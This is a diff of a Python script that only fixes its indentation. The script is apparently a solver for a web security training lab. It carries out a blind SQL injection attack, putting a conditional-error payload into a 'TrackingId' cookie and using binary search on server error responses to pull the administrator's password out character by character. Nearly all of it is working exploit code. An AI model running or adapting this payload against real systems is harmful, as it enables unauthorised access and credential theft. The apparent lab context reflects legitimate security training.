@@ -21,25 +21,25 @@ headers = {
 #Function to send the request and check for errors
 def send_request(tracking_id):
 	cookies = {
-	"TrackingId": tracking_id,
-	"session": "e36t7fMNR7WrArwnQeYSY8RgYJhneu0D"
-}
+		"TrackingId": tracking_id,
+		"session": "e36t7fMNR7WrArwnQeYSY8RgYJhneu0D"
+	}
 	response = requests.get(url, headers=headers, cookies=cookies)
 	return "Internal Server Error" in response.text
 #Function to brute-force each character of the password with binary search
 def brute_force_password():
 	password = ""
 	for i in range(1, 21):
-	low, high = 32, 126  # ASCII range for printable characters
-	while low <= high:
-	mid = (low + high) // 2
-	tracking_id = f"Fh2QoMeYpZL5YQUe'||(SELECT CASE WHEN SUBSTR(password,{i},1)>'{chr(mid)}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
-	if send_request(tracking_id):
-	low = mid + 1
-	else:
-	high = mid - 1
-	password += chr(low)
-	print(f"Found character {i}: {password[-1]}")
+		low, high = 32, 126  # ASCII range for printable characters
+		while low <= high:
+			mid = (low + high) // 2
+			tracking_id = f"Fh2QoMeYpZL5YQUe'||(SELECT CASE WHEN SUBSTR(password,{i},1)>'{chr(mid)}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+			if send_request(tracking_id):
+				low = mid + 1
+			else:
+				high = mid - 1
+		password += chr(low)
+		print(f"Found character {i}: {password[-1]}")
 	return password
 	
 # Start the brute-forcing process
